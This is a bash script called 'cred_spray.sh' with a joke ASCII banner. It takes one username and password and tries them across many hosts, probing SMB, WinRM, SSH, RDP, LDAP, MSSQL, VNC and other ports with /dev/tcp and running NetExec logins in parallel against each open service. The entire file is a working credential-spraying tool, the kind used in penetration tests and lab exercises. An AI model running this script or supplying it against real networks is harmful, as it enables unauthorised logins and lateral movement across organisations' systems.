#!/usr/bin/env bash
#
# cred_spray.sh — Parallel credentialed service sweep using NetExec (nxc)
#
# Probes each host/service port pair, skips closed ports, and only runs
# nxc against services that are actually open — with throttled concurrency
# so it scales safely to large host lists.
#
# Usage:
#   ./cred_spray.sh [-j max_jobs] [-d launch_delay] [-t probe_timeout] [-n nxc_timeout] <user> <pass> <host1> [host2] [host3] ...
#
# Options:
#   -j N   Max number of concurrent probe/nxc jobs (default: 10)
#   -d N   Seconds to sleep between launching each job (default: 0.3)
#   -t N   Seconds to wait on the /dev/tcp port probe before declaring it closed (default: 15)
#   -n N   Seconds to allow each nxc authentication attempt to run (default: 15)
#
# Examples:
#   ./cred_spray.sh bob 'b0bsp4ss1sth3b3st' 192.168.118.129 192.168.118.130 192.168.118.131
#   ./cred_spray.sh -j 20 -d 0.1 -t 5 -n 20 bob 'b0bsp4ss1sth3b3st' 192.168.118.129 192.168.118.130

printf '%s\n' '

	  ██████╗██████╗ ███████╗██████╗ ██╗    ██╗ █████╗ ██╗     ██╗  ██╗
	 ██╔════╝██╔══██╗██╔════╝██╔══██╗██║    ██║██╔══██╗██║     ██║ ██╔╝
	 ██║     ██████╔╝█████╗  ██║  ██║██║ █╗ ██║███████║██║     █████╔╝
	 ██║     ██╔══██╗██╔══╝  ██║  ██║██║███╗██║██╔══██║██║     ██╔═██╗
	 ╚██████╗██║  ██║███████╗██████╔╝╚███╔███╔╝██║  ██║███████╗██║  ██╗
	  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

		         taking the credential for a walk

       based on a true story. 47 hosts. 8 services each. zero willingness for manual typing

          "works here"          "apparently here too"           "oh well"
              (._.)                    (•̀ᴗ•́)و                     (⌐■_■)
              /|  \                    /|  \                     /|   \
             / \  \                   / \  \                    / \   \

       [1 host · 1 service]    [2 hosts · 3 services]     [17 hosts · 5 services]
'

set -u

usage() {
    echo "Usage: $0 [-j max_jobs] [-d launch_delay] [-t probe_timeout] [-n nxc_timeout] <user> <pass> <host1> [host2] [host3] ..." >&2
    exit 1
}

# Defaults — overridable via -j / -d / -t / -n
max_jobs=10
launch_delay=0.3
probe_timeout=15
nxc_timeout=15

while getopts ":j:d:t:n:" opt; do
    case "$opt" in
        j) max_jobs="$OPTARG" ;;
        d) launch_delay="$OPTARG" ;;
        t) probe_timeout="$OPTARG" ;;
        n) nxc_timeout="$OPTARG" ;;
        *) usage ;;
    esac
done
shift $((OPTIND - 1))

if [ "$#" -lt 3 ]; then
    usage
fi

user1="$1"
pass1="$2"
shift 2
hosts="$*"

declare -A ports=(
    [nfs]=2049
    [winrm]=5985
    [ftp]=21
    [ssh]=22
    [smb]=445
    [rdp]=3389
    [ldap]=389
    [mssql]=1433
    [vnc]=5900
    [wmi]=135
)

for h in $hosts; do
    for s in "${!ports[@]}"; do
        while [ "$(jobs -rp | wc -l)" -ge "$max_jobs" ]; do
            wait -n
        done
        (
            timeout "$probe_timeout" bash -c "echo >/dev/tcp/$h/${ports[$s]}" 2>/dev/null \
                && timeout "$nxc_timeout" nxc "$s" "$h" -u "$user1" -p "$pass1" --timeout "$nxc_timeout" 2>/dev/null
        ) &
        sleep "$launch_delay"
    done
done

wait
